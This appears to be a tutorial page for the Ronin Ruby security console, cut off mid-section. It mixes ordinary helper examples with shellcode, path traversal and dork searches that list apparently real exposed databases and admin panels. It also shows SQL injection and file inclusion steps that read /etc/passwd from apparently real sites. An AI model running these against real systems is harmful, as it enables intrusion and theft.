<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="../../xsl/page.xsl"?>
<rubyforge xmlns:xi="http://www.w3.org/2001/XInclude">
  <title>Everyday Ronin</title>

  <page>
    <xi:include href="../_menu.xml" />

    <content>
      <section label="everyday_ronin" title="Everyday Ronin">
        <p>
          In day-to-day usage, the Ronin Console is the most commonly used
          component of Ronin. The Ronin Console is not to be confused with
          the text-based adventure shells commonly found in many other
          projects. Instead, the Ronin Console is a customized
          <a href="http://en.wikipedia.org/wiki/Interactive_Ruby_Shell">
            Interactive Ruby Shell (IRB)
          </a> with tab-completion and auto-indentation enabled. The
          Console provides one with the full power of the Ruby language and
          the convenience methods of Ronin, all in a handy console. From
          this Console one can perform research, scan for vulnerabilities
          and even exploit vulnerable targets.
        </p>

        <p>
          To install Ronin and the supporting libraries used in this HOWTO,
          simply run the following command:
        </p>
        <shell>$ sudo gem install ronin ronin-dorks ronin-php ronin-sql</shell>

        <p>
          To start the Ronin Console, simply run the <kbd>ronin</kbd>
          command:
        </p>
        <shell>$ ronin</shell>

        <note>
          If you are new to the Ruby programming language, you might
          consider reviewing the <a href="http://www.rubycentral.com/book/">
            Pragmatic Programmers Guide to Ruby
          </a>, since it is expected that users of the Ronin Console have a 
          basic understanding of Ruby programming practices.
        </note>

        <note>
          If you have questions regarding the methods or Classes defined
          within Ronin, you can consult Ronin's
          <a href="http://ronin.rubyforge.org/docs/ronin/">
            API documentation
          </a>. If on the other hand, you have questions about methods or
          Classes provided by Ruby itself, I recommend using
          <a href="http://www.ruby-doc.org/">www.ruby-doc.org</a>. 
        </note>

        <list>
          <item>
            <jump name="methods">Convenience Methods</jump>
            <list>
              <item><jump name="binary">Formatting Binary Data</jump></item>
              <item><jump name="text">Generating Text</jump></item>
              <item><jump name="base64">Base64</jump></item>
              <item><jump name="digests">Digests</jump></item>
              <item><jump name="paths">Paths</jump></item>
              <item><jump name="networking">Networking</jump></item>
              <item><jump name="urls">URLs</jump></item>
              <item><jump name="http">HTTP</jump></item>
            </list>
          </item>

          <item>
            <jump name="web">Web</jump>
          </item>

          <item>
            <jump name="dorks">Google<tm /> Dorks</jump>
          </item>

          <item>
            <jump name="sql">SQL Injection</jump>
          </item>

          <item>
            <jump name="php">PHP</jump>
            <list>
              <item><jump name="lfi">Local File Inclusion</jump></item>
              <item><jump name="rfi">Remote File Inclusion</jump></item>
            </list>
          </item>
        </list>
      </section>

      <section label="methods" title="Convenience Methods">
        <subsection label="binary" title="Formatting Binary Data">
          <p>
            Packing an
            <a href="http://www.ruby-doc.org/core/classes/Integer.html">
              Integer
            </a>:
          </p>
          <code>&gt;&gt; 0x1337.pack(Arch.i686)
=&gt; "7\x13\0\0"</code>
              
          <note>
            In Ruby everything is an <a href="http://www.ruby-doc.org/core/classes/Object.html">
              Object
            </a>, even
            <a href="http://www.ruby-doc.org/core/classes/Integer.html">
              Integers
            </a> and
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              Strings
            </a> 
            are represented as Objects. These Objects have methods and
            are defined by Classes, much like any other Object in Ruby.
            In the example above Ronin has added the
            <a href="http://ronin.rubyforge.org/docs/ronin/classes/Integer.html#M000001">pack</a>
            method to the Integer class. Ruby's ability to add or
            modify methods of pre-defined Classes is known as Open
            Objects.
          </note>

          <p>
            Packing an
            <a href="http://www.ruby-doc.org/core/classes/Integer.html">
              Integer
            </a>
            with a custom address length:
          </p>
          <code>&gt;&gt; 0x1337.pack(Arch.arm_le,2)
=&gt; "7\x13"</code>
              
          <p>
            Depacking an a packed
            <a href="http://www.ruby-doc.org/core/classes/Integer.html">
              Integer
            </a>:
          </p>
          <code>&gt;&gt; "7\x13\0\0".depack(Arch.i686)
=&gt; 4919</code>
        </subsection>

        <subsection label="text" title="Generating Text">
          <p>
            Please see the <a href="http://chars.rubyforge.org/">Chars</a>
            library for text generation examples.
          </p>
        </subsection>

        <subsection label="base64" title="Base64">
          <p>
            Base64 encode a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; payload = "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\
\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01\x00\
\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xffxff\x2f\x62\x69\x6e\x2f\
\x73\x68\x00\x89\xec\x5d\xc3"

&gt;&gt; payload.base64_encode
=&gt; "6ypeiXYIxkYHAMdGDAAAAAoAuAsAAACJ841OCI1WDM2AuAEAAAC7AAAAAM2A\n6NH///8vYmluL3NoAInsXcM=\n"</code>

          <p>
            Base64 decode a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; "c2VjcmV0\n".base64_decode
=&gt; "secret"</code>
        </subsection>

        <subsection label="digests" title="Digests">
          <p>
            Return the MD5 checksum of a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; "leet school".md5
=&gt; "1b11ba66f5e9d40a7eef699cd812e362"</code>

          <p>
            Return the SHA1 checksum of a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; "lol train".sha1
=&gt; "37f05f0cc2914615c580af396df5c66316112f48"</code>
          
          <p>
            Return the SHA256 checksum of a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; "admin".sha256
=&gt; "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"</code>

          <p>
            Return the SHA512 checksum of a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; "thunder growl".sha512
=&gt; "b2a1e560a497514dafda024f9e6fc2dfbfb178483251a708f07a88d4e157e5561604460da313ebc88dde2814ae58a15ae4085d00efb6a825a62f5be3215f5cbf"</code>
        </subsection>

        <subsection label="paths" title="Paths">
          <p>Escaping a directory:</p>
          <code>&gt;&gt; Path.up(7)
=&gt; #&lt;Ronin::Path:../../../../../../..&gt;</code>

          <p>Directory transversal:</p>
          <code>&gt;&gt; Path.up(7) / 'etc' / 'passwd'
=&gt; #&lt;Ronin::Path:../../../../../../../etc/passwd&gt;</code>
        </subsection>

        <subsection label="networking" title="Networking">
          <p>Creating a TCP Socket for a specified host and port:</p>
          <code>&gt;&gt; sock = Net.tcp_connect('www.example.com', 25)
=&gt; #&lt;TCPSocket:0xb7bbde6c&gt;</code>

          <p>Creating a TCP Socket with local host and port information:</p>
          <code>&gt;&gt; Net.tcp_connect('www.example.com', 25, 'some.interface.net', 1212)
=&gt; #&lt;TCPSocket:0xb7ba0dd0&gt;</code>

          <p>Create a TCP Socket, then send some data:</p>
          <code>&gt;&gt; Net.tcp_connect_and_send("helo lol.train.com\n", 'www.example.com', 25)
=&gt; #&lt;TCPSocket:0xb7b8fa6c&gt;</code>

          <p>Creating a TCP session which will be automatically closed:</p>
          <code>&gt;&gt; Net.tcp_session('www.example.com', 1212) do |sock|
  sock.write("this is just a test\n")
  puts sock.readline
end</code>

          <p>Grabbing the banner of a TCP service:</p>
          <code>&gt;&gt; Net.tcp_banner('www.example.com', 22)
=&gt; "SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1.4\n"</code>

          <p>Creating a UDP Socket for a specified host and port:</p>
          <code>&gt;&gt; sock = Net.udp_connect('www.example.com', 135)
=&gt; #&lt;UDPSocket:0xb7bbde6c&gt;</code>

          <p>Creating a UDP Socket with local host and port information:</p>
          <code>&gt;&gt; Net.udp_connect('www.example.com', 135, 'some.interface.net', 3030)
=&gt; #&lt;UDPSocket:0xb7ba0dd0&gt;</code>

          <p>Create a UDP Socket, then send some data:</p>
          <code>&gt;&gt; Net.udp_connect_and_send("mic check\n", 'www.example.com', 1212)
=&gt; #&lt;UDPSocket:0xb7b8fa6c&gt;</code>

          <p>Creating a UDP session which will be automatically closed:</p>
          <code>&gt;&gt; Net.udp_session('www.example.com', 3030) do |sock|
  sock.write("I want to devise a virus.\n")
  puts sock.readline
end
=&gt; nil</code>

          <note>
            For more Networking convenience methods checkout Ronin's
            documentation for the <a href="http://ronin.rubyforge.org/docs/ronin/classes/Net.html">Net</a>
            module.
          </note>
        </subsection>

        <subsection label="urls" title="URLs">
          <p>Accessing the URL query parameters:</p>
          <code>&gt;&gt; url = URI('http://www.google.com/search?hl=en&amp;client=firefox-a&amp;rls=org.mozilla%3Aen-US%3Aofficial&amp;hs=1HY&amp;q=bob+ross&amp;btnG=Search')
=&gt; #&lt;URI::HTTP:0xfdbcdcb06 URL:http://www.google.com/search?btnG=Search&amp;hs=1HY&amp;rls=org.mozilla:en-US:official&amp;client=firefox-a&amp;hl=en&amp;q=bob+ross&gt;
&gt;&gt; url.query_params
=&gt; {"btnG"=&gt;"Search", "hs"=&gt;"1HY", "rls"=&gt;"org.mozilla:en-US:official", "client"=&gt;"firefox-a", "hl"=&gt;"en", "q"=&gt;"bob+ross"}
&gt;&gt; url.query_params['q']
=&gt; "bob+ross"</code>

          <p>Setting the URL query parameters:</p>
          <code>&gt;&gt; url.query_params['q'] = 'Upright Citizens Brigade'
=&gt; "Upright Citizens Brigade"
&gt;&gt; puts url
http://www.google.com/search?btnG=Search&amp;hs=1HY&amp;rls=org.mozilla:en-US:official&amp;client=firefox-a&amp;hl=en&amp;q=Upright%20Citizens%20Brigade
=&gt; nil</code>

          <p>Setting the URL query parameters en-mass:</p>
          <code>&gt;&gt; url.query_params = {'q'=&gt;'meowmix', 'start' =&gt; 20, 'sa' =&gt; 'N'}
=&gt; {"q"=&gt;"meowmix", "start"=&gt;20, "sa"=&gt;"N"}
&gt;&gt; puts url
http://www.google.com/search?sa=N&amp;start=20&amp;q=meowmix
=&gt; nil</code>

          <p>Exploding a URLs query parameters:</p>
          <code>&gt;&gt; url = URI('http://search.dhgate.com/search.do?dkp=1&amp;searchkey=yarn&amp;catalog=')
=&gt; #&lt;URI::HTTP:0xfdb917188 URL:http://search.dhgate.com/search.do?searchkey=yarn&amp;catalog=&amp;dkp=1&gt;
&gt;&gt; url.explode_query_params("'")
=&gt; {"searchkey"=&gt;#&lt;URI::HTTP:0xfdb915e82 URL:http://search.dhgate.com/search.do?searchkey='&amp;catalog=&amp;dkp=1&gt;, 
 "catalog"=&gt;#&lt;URI::HTTP:0xfdb915e6e URL:http://search.dhgate.com/search.do?searchkey=yarn&amp;catalog='&amp;dkp=1&gt;,
 "dkp"=&gt;#&lt;URI::HTTP:0xfdb915e5a URL:http://search.dhgate.com/search.do?searchkey=yarn&amp;catalog=&amp;dkp='&gt;}</code>
        </subsection>

        <subsection label="http" title="HTTP">
          <p>HTTP Proxy settings:</p>
          <code>&gt;&gt; Metwork::HTTP.proxy
=&gt; {:port=>8080, :pass=>nil, :user=>nil, :host=>nil}</code>

          <p>Setting the HTTP Proxy settings:</p>
          <code>&gt;&gt; Network::HTTP.proxy[:host] = '200.207.114.146'
=&gt; "200.207.114.146"
&gt;&gt; Network::HTTP.proxy[:port] = 8080
=&gt; 8080</code>

          <p>Disabling HTTP Proxy settings:</p>
          <code>&gt;&gt; Network::HTTP.disable_proxy
=&gt; {:port=>8080, :pass=>nil, :user=>nil, :host=>nil}</code>

          <p>Getting a web-page:</p>
          <code>&gt;&gt; Net.http_get(:url => 'http://www.wired.com/')
=&gt; #&lt;Net::HTTPOK 200 OK readbody=true&gt;</code>

          <p>Getting only the body of a web-page:</p>
          <code>&gt;&gt; Net.http_get_body(:url => 'http://www.wired.com/')
=&gt; "..."</code>

          <p>Posting to a web-page:</p>
          <code>&gt;&gt; Net.http_post(:url => some_url, :post_data => {:q => 1, :id => 255})
=&gt; #&lt;Net::HTTPOK 200 OK readbody=true&gt;</code>

          <p>Posting to a web-page and only returning the body of the response:</p>
          <code>&gt;&gt; Net.http_post_body(:url => some_url)
=&gt; "..."</code>
        </subsection>
      </section>

      <section label="web" title="Web">
        <p>
          The <a href="http://ronin.rubyforge.org/docs/ronin-web/">
            Ronin Web
          </a> library provides support for Web Scraping and Spidering
          functionality in Ronin. Before we can use this library in the
          Ronin Console, we must first
          <a href="http://www.ruby-doc.org/core/classes/Kernel.html#M001077">
            require
          </a> it.
        </p>

        <code>&gt;&gt; require 'ronin/web'
=&gt; true</code>

        <p>
          Ronin Proxy settings, just like in
          <a href="http://ronin.rubyforge.org/docs/ronin/classes/Ronin/Network/HTTP.html">Network::HTTP</a>.
        </p>
        <code>&gt;&gt; Web.proxy
=&gt; {:port=>8080, :pass=>nil, :user=>nil, :host=>nil}</code>

        <p>Ronin User-Agent setting:</p>
        <code>&gt;&gt; Web.user_agent
=&gt; nil
&gt;&gt; Web.user_agent = 'PowerThurst Bot v4.7'
=&gt; "PowerThurst Bot v4.7"</code>
          
        <p>User-Agent aliases:</p>
        <code>&gt;&gt; Web.user_agent_aliases
 =&gt; {"Mac Mozilla"=&gt;"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.4a) Gecko/20030401",
 "Mechanize"=&gt;"WWW-Mechanize/0.7.6 (http://rubyforge.org/projects/mechanize/)",
 "Linux Mozilla"=&gt;"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4) Gecko/20030624",
 "Windows IE 6"=&gt;"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
 "iPhone"=&gt;"Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1C28 Safari/419.3",
 "Windows IE 7"=&gt;"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Linux Konqueror"=&gt;"Mozilla/5.0 (compatible; Konqueror/3; Linux)",
 "Mac FireFox"=&gt;"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3",
 "Windows Mozilla"=&gt;"Mozilla/5.0 (Windows;U; Windows NT 5.0; en-US; rv:1.4b) Gecko/20030516 Mozilla Firebird/0.6",
 "Mac Safari"=&gt;"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418 (KHTML, like Gecko) Safari/417.9.3"}</code>

        <p>Setting the Ronin User-Agent alias:</p>
        <code>&gt;&gt; Web.user_agent_alias = 'iPhone'
=&gt; "iPhone"</code>

        <p>
          Getting a persistent
          <a href="http://mechanize.rubyforge.org/mechanize/classes/WWW/Mechanize.html">
            WWW::Mechanize
          </a> agent:
        </p>
        <code>&gt;&gt; agent = Web.agent(:user_agent_alias => 'iPhone')
=&gt; #&lt;WWW::Mechanize:...&gt;
&gt;&gt; agent.get('http://news.ycombinator.net/')
=&gt; #&lt;WWW::Mechanize::Page:...&gt;</code>

        <p>Getting a web-page:</p>
        <code>&gt;&gt; Web.get('http://0x000000.com/')
=&gt; #&lt;WWW::Mechanize::Page:...&gt;</code>

        <p>Return the body of a web-page:</p>
        <code>&gt;&gt; Web.get_body('http://0x000000.com/')
=&gt; "..."</code>

        <p>Posting to a web-page:</p>
        <code>&gt;&gt; Web.post('http://www.example.com/login.php', :query =&gt; {:user => 'meowmix', :password => 'delivers'})
=&gt; #&lt;WWW::Mechanize::Page:...&gt;</code>

        <p>Return the body of a posted web-page:</p>
        <code>&gt;&gt; Web.post_body('http://www.example.com/login.php', :query =&gt; {:user => 'meowmix', :password => 'delivers'})
=&gt; "..."</code>

        <p>Opening a web-page as a file:</p>
        <code>&gt;&gt; Web.open('http://www.example.com/users.php')
=&gt; #&lt;File:/tmp/open-uri.6645.0&gt;</code>
      </section>

      <section label="dorks" title="Google Dorks">
        <p>
          The
          <a href="http://ronin.rubyforge.org/docs/ronin-dorks/">
            Ronin Dorks
          </a>
          library provides support for Google<tm /> Dork
          functionality in Ronin. Before we can use this library in the
          Ronin Console, we must first
          <a href="http://www.ruby-doc.org/core/classes/Kernel.html#M001077">
            require
          </a>
          it.
        </p>

        <code>&gt;&gt; require 'ronin/dorks'
=&gt; true</code>

        <p>Basic query:</p>
        <code>&gt;&gt; Web::Dorks.search(:query =&gt; 'ruby').first_page.titles
=&gt; ["Ruby Programming Language",
"Ruby (programming language) - Wikipedia, the free encyclopedia",
"Ruby - Wikipedia, the free encyclopedia",
"NetBeans IDE - Ruby and Rails features",
"Ruby on Rails",
"YouTube - Kaiser Chiefs - Ruby",
"Ruby Annotation",
"Ruby Central"]</code>

        <p>inurl:</p>
        <code>&gt;&gt; Web::Dorks.inurl(/page\.(php|asp)/).first_page.urls
=&gt; [#&lt;URI::HTTP:0xfdbcd3d1c URL:http://www.vark-learn.com/english/page.asp?p=questionnaire&gt;,
#&lt;URI::HTTP:0xfdbd9d3ba URL:http://www.webconfs.com/similar-page-checker.php&gt;,
#&lt;URI::HTTP:0xfdbcaf822 URL:http://www.metallica.com/page.asp?id=13367&gt;,
#&lt;URI::HTTP:0xfdbca0818 URL:http://scripts.sil.org/cms/scripts/page.php?site_id=nrsi&amp;id=encore-ipa&gt;,
#&lt;URI::HTTP:0xfdbc91a0c URL:http://www.unctad.org/Templates/Page.asp?lang=1&amp;intItemID=3198&gt;,
#&lt;URI::HTTP:0xfdbc79510 URL:http://royalsociety.org/page.asp?id=6229&gt;,
#&lt;URI::HTTP:0xfdbc59602 URL:http://www.poets.org/page.php/prmID/58&gt;,
#&lt;URI::HTTP:0xfdbc4a210 URL:http://www.dhh.louisiana.gov/offices/page.asp?ID=192&amp;Detail=5248&gt;,
#&lt;URI::HTTP:0xfdbc37fe8 URL:http://www.youthnoise.com/page.php?page_id=2335&gt;,
#&lt;URI::HTTP:0xfdbc1f100 URL:http://www.tpchd.org/page.php?id=364&gt;]</code>

        <p>String inurl:</p>
        <code>&gt;&gt; Web::Dorks.string_inurl("template.inc.php?dir=").first_page.urls
=&gt; [#&lt;URI::HTTP:0xfdbd2d1b4 URL:http://svn.modxcms.com/crucible/browse/modx/branches/0.9.7/core/lexicon/en/template.inc.php&gt;, 
#&lt;URI::HTTP:0xfdbcf316c URL:http://svn.modxcms.com/crucible/browse/modx/branches/0.9.7/manager/includes/lang/english/template.inc.php&gt;, 
#&lt;URI::HTTP:0xfdbcc75a8 URL:http://scripts.ringsworld.com/customer-support/rockcontact-0.7.3/includes/template.inc.php.html&gt;, 
#&lt;URI::HTTP:0xfdbd9a20a URL:http://newspoke.cpe.ku.ac.th/websvn/listing.php?sc=1&amp;opt=dir&amp;repname=Lervatta.Web&amp;path=/trunk/www/template.inc.php/&gt;,
#&lt;URI::HTTP:0xfdbcaf390 URL:http://www.hypernietzsche.org/websvn/listing.php?sc=1&amp;opt=dir&amp;repname=Hyper&amp;path=/root/includes/classes/class.Template.inc.php/&gt;,
#&lt;URI::HTTP:0xfdbc9ef36 URL:http://www.hypernietzsche.org/websvn/filedetails.php?rev=1&amp;sc=1&amp;repname=Hyper&amp;path=/root/admin/inserts/includes/template.inc.php/&gt;]</code>

        <p>allinurl:</p>
        <code>&gt;&gt; Web::Dorks.allinurl(['php?', 'page=']).first_page.urls
 =&gt; [#&lt;URI::HTTP:0xfdbbe2df4 URL:http://www.jedit.org/index.php?page=download&gt;,
#&lt;URI::HTTP:0xfdbbd8908 URL:http://www.lizardtech.com/download/dl_options.php?page=plugins&gt;,
#&lt;URI::HTTP:0xfdbbcc55e URL:http://www.archaeological.org/webinfo.php?page=10007&gt;,
#&lt;URI::HTTP:0xfdbbc5d4e URL:http://www.polarion.org/index.php?project=subversive&amp;page=overview&gt;,
#&lt;URI::HTTP:0xfdbd28d12 URL:http://www.ourdocuments.gov/content.php?page=milestone&gt;,
#&lt;URI::HTTP:0xfdbcf0a34 URL:http://www.mensa.org/index0.php?page=12&gt;,
#&lt;URI::HTTP:0xfdbcc55a0 URL:http://reg.imageshack.us/content.php?page=faq&gt;,
#&lt;URI::HTTP:0xfdbd9da4a URL:http://www.groklaw.net/staticpages/index.php?page=20051216153153504&gt;,
#&lt;URI::HTTP:0xfdbcb6186 URL:http://ktorrent.org/index.php?page=downloads&gt;,
#&lt;URI::HTTP:0xfdbca58c2 URL:http://www.fair.org/index.php?page=111&gt;]</code>

        <p>Index of cgi-bin:</p>
        <code>&gt;&gt; Web::Dorks.index_of_cgi_bin.first_page.urls
=&gt;> [#&lt;URI::HTTP:0xfdbbe764c URL:http://www.delta-green.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbbe0270 URL:http://www.portales-news.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbbd4592 URL:http://www.newcyber-3d.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbbca394 URL:http://now.what-happens.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbbc3a44 URL:http://www.fameishmedia.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbd14e02 URL:http://eraserhead.net/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbce2f74 URL:http://www.bunnyjane.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdbdc4a8c URL:http://1a-automarktplatz.de/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdba221fe URL:http://www.anniemayhem.com/cgi-bin/&gt;,
#&lt;URI::HTTP:0xfdba1be26 URL:http://linguafranca.mirror.theinfo.org/cgi-bin/&gt;]</code>

        <p>MySQL dump files:</p>
        <code>&gt;&gt; Web::Dorks.mysql_dump.first_page.urls
=&gt; [#&gt;URI::HTTP:0xfdb9e059c URL:http://lyricwiki.org/survey.sql&gt;,
#&lt;URI::HTTP:0xfdb9d9f58 URL:http://www.flamingspork.com/projects/memberdb/original_mysql_create_db.sql&gt;,
#&lt;URI::HTTP:0xfdb9d34dc URL:http://mek.niif.hu/html/katalogusdump/mek2_mezok.sql&gt;,
#&lt;URI::HTTP:0xfdb9ccd30 URL:http://www.vaxman.de/vwa_ba/examples/umfrage.sql&gt;,
#&lt;URI::HTTP:0xfdb9c66c4 URL:http://sgu.bioinfo.cipf.es/services/Omidios/db/20070514_Omidios_db.sql&gt;,
#&lt;URI::HTTP:0xfdb9bfcc0 URL:http://www.banadushi.com/mysql/slavesetup.sql&gt;,
#&lt;URI::HTTP:0xfdb9b93fc URL:http://perkins.pvt.k12.ma.us/perkinsdump.1204.sql&gt;,
#&lt;URI::HTTP:0xfdb9b282c URL:http://it1102.idi.ntnu.no/slides/Teknisk07_MySQL.sql&gt;,
#&lt;URI::HTTP:0xfdb9ab824 URL:http://svn.bitflux.ch/repos/public/planet-php/trunk/div/db/mysql.sql&gt;,
#&lt;URI::HTTP:0xfdb9a4b3c URL:http://wiki.powerdns.com/cgi-bin/trac.fcgi/attachment/ticket/8/dump.sql&gt;]</code>

        <p>PHP MyAdmin:</p>
        <code>>> Web::Dorks.php_my_admin.first_page.urls
=&gt; [#&lt;URI::HTTP:0xfdb9663b4 URL:http://www.novarigenerazione.it/A_Sashimi_Support/dbadmin/main.php&gt;,
#&lt;URI::HTTP:0xfdb95f172 URL:http://cache.univ-tlse1.fr/applis/phpmyadmin/main.php?collation_connection=utf8_general_ci&amp;server=1&amp;lang=en-utf-8&gt;,
#&lt;URI::HTTP:0xfdb957814 URL:http://www.fangyuan.gov.tw/phpMyAdmin/main.php?server=1&amp;lang=en-iso-8859-1&gt;,
#&lt;URI::HTTP:0xfdb95028a URL:http://nowystyl.com.ua/pma99/main.php&gt;,
#&lt;URI::HTTP:0xfdb949624 URL:http://www.csinaljbulit.hu/phpmyadmin/main.php?collation_connection=utf8_general_ci&amp;server=1&amp;lang=en-utf-8&gt;,
#&lt;URI::HTTP:0xfdb9420ae URL:http://137.189.89.120/phpMyAdmin/main.php?collation_connection=utf8_general_ci&amp;server=1&amp;lang=en-utf-8&gt;,
#&lt;URI::HTTP:0xfdb93a91c URL:http://alternc.net/admin/sql/main.php?server=1&amp;lang=en-iso-8859-1&gt;,
#&lt;URI::HTTP:0xfdb933874 URL:http://www.666counter.net/admin4/main.php?collation_connection=utf8_general_ci&amp;mode=reload&amp;server=1&amp;lang=en-utf-8&gt;,
#&lt;URI::HTTP:0xfdb92c484 URL:http://www.e-dayuan.com.tw/phpmyadmin/main.php?collation_connection=utf8_general_ci&amp;server=1&amp;lang=en-utf-8&gt;,
#&lt;URI::HTTP:0xfdb924f0e URL:http://spsound.com/phpmyadmin/main.php?collation_connection=utf8_general_ci&amp;server=1&amp;lang=en-utf-8&gt;]</code>
      </section>

      <section label="sql" title="SQL Injection">
        <p>
          The
          <a href="http://ronin.rubyforge.org/docs/ronin-sql/">
            Ronin SQL
          </a>
          library provides support for SQL related security tasks, such as
          scanning for SQL injection and exploiting it. Before we can use
          this library, we have to first
          <a href="http://www.ruby-doc.org/core/classes/Kernel.html#M005967">
            require
          </a>
          it.
        </p>
        <code>&gt;&gt; require 'ronin/sql'
=&gt; true</code>

        <p>
          Test a
          <a href="http://www.ruby-doc.org/core/classes/String.html">
            String
          </a>
          for SQL Database errors:
        </p>
        <code>&gt;&gt; SQL.has_error?(response)
=&gt; true</code>

        <p>Return SQL error types and messages:</p>
        <code>&gt;&gt; SQL.error(response)
=&gt; #&lt;Ronin::SQL::Error:0xb702e038 @message="Warning:  mysql_free_res
ult(): supplied argument is not a valid MySQL result" @type=:mysql&gt;</code>

        <p>Test a URL for SQL errors:</p>
        <code>&gt;&gt; url = URI('http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1')
=&gt; #&lt;URI::HTTP:0xfdb826ef4 URL:http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1&gt;
&gt;&gt; url.has_sql_errors?
=&lt; true</code>

        <p>
          Return a
          <a href="http://www.ruby-doc.org/core/classes/Hash.html">
            Hash
          </a>
          of SQL Injectable query parameters and their SQL errors:
        </p>
        <code>&gt;&gt; url.sql_errors
=&gt; {"viewCat"=&gt;#&lt;Ronin::SQL::Error:0xb704a288 @message="Warning:  mysql_free_res
ult(): supplied argument is not a valid MySQL result", @type=:mysql&gt;}</code>
      </section>

      <section label="php" title="PHP">
        <p>
          The
          <a href="http://ronin.rubyforge.org/docs/ronin-php/">
            Ronin PHP
          </a>
          library provides support for various PHP related security tasks,
          such as leveraging Local and Remote File Inclusion. Before we can
          use this library in the Ronin Console, we have to first
          <a href="http://www.ruby-doc.org/core/classes/Kernel.html#M005967">
            require
          </a>
          it.
        </p>
        <code>&gt;&gt; require 'ronin/php'
=&gt; true</code>

        <subsection label="lfi" title="Local File Inclusion (LFI)">
          <p>Test a URL for LFI:</p>
          <code>&gt;&gt; url = URI('http://www.e-builds.com/?page=Portfolio')
=&gt; #&lt;URI::HTTP:0xfdb67c266 URL:http://www.e-builds.com/?page=Portfolio>
&gt;&gt; url.has_lfi?
=&gt; true</code>

          <p>
            Return a
            <a href="http://ronin.rubyforge.org/docs/ronin-php/classes/Ronin/PHP/LFI.html">
              PHP::LFI
            </a>
            object which can be used to access files or finger-print the
            web server:
          </p>
          <code>&gt;&gt; vuln = url.first_lfi
=&gt; #&lt;Ronin::PHP::LFI:0xb6ccbbe8 @terminate=true, @up=7, @prefix=nil,
@url=#&lt;URI::HTTP:0xfdb67c266 URL:http://www.e-builds.com/?page=Portfolio&gt;,
@param="page", @os=nil&gt;</code>

          <p>
            Return a file as a
            <a href="http://www.ruby-doc.org/core/classes/String.html">
              String
            </a>:
          </p>
          <code>&gt;&gt; vuln.get('/etc/passwd')
=&gt; "..."</code>

          <p>
            Return a file as a
            <a href="http://ronin.rubyforge.org/docs/ronin-php/classes/Ronin/PHP/LFI/File.html">
              PHP::LFI::File
            </a>
            object similar to the
            <a href="http://www.ruby-doc.org/core/classes/File.html">
              File
            </a>
            class:
          </p>
          <code>&gt;&gt; vuln.include('/etc/passwd')
=&gt; #&lt;Ronin::PHP::LFI::File:/etc/passwd&gt;</code>

          <p>
            Return a
            <a href="http://ronin.rubyforge.org/docs/ronin-php/classes/Ronin/PHP/LFI/File.html">
              PHP::LFI::File
            </a>
            object only if the response is recognized as containing the
            targeted file:
          </p>
          <code>&gt;&gt; vuln.include_target('lighttpd.conf')
=&gt; #&lt;Ronin::PHP::LFI::File:/etc/lighttpd/lighttpd.conf&gt;</code>

          <p>
            Save a targeted file only if the response is recognized as
            containing the targeted file:
          </p>
          <code>&gt;&gt; vuln.save_target('wtmp','/tmp/wtmp')
=&gt; "/tmp/wtmp"</code>

          <p>
            Mirror commonly targeted files to a specified local directory:
          </p>
          <code>&gt;&gt; vuln.mirror_targets('/tmp/e-builds/')
=&gt; [...]</code>

          <p>Fingerprint the web-server:</p>
          <code>&gt;&gt; vuln.fingerprint
=&gt; {:mysql_data_dir=&gt;"/var/lib/mysql",
:lighttpd_bind=&gt;"172.18.0.102",
:mysql_bind=&gt;"127.0.0.1",
:lighttpd_port=&gt;"81",
:mysql_user=&gt;"mysql",
:mysql_port=&gt;"3306",
:lighttpd_error_log=&gt;"/var/log/lighttpd/error.log",
:lighttpd_pid_file=&gt;"/var/run/lighttpd.pid",
:mysql_socket=&gt;"/var/run/mysqld/mysqld.sock",
:lighttpd_access_log=&gt;"/var/log/lighttpd/access.log"}</code>
        </subsection>

        <subsection label="rfi" title="Remote File Inclusion (RFI)">
          <p>Test a URL for RFI:</p>
          <code>&gt;&gt; url = URL('http://www.example.com/page.php?layout=default')
=&gt; #&lt;URI::HTTP:0xfdb7a3d4c URL:http://www.example.com/page.php?layout=default&gt;
&gt;&gt; url.has_rfi?
=&gt; true</code>

          <p>
            Return a
            <a href="http://ronin.rubyforge.org/docs/ronin-php/classes/Ronin/PHP/RFI.html">
              PHP::RFI
            </a>
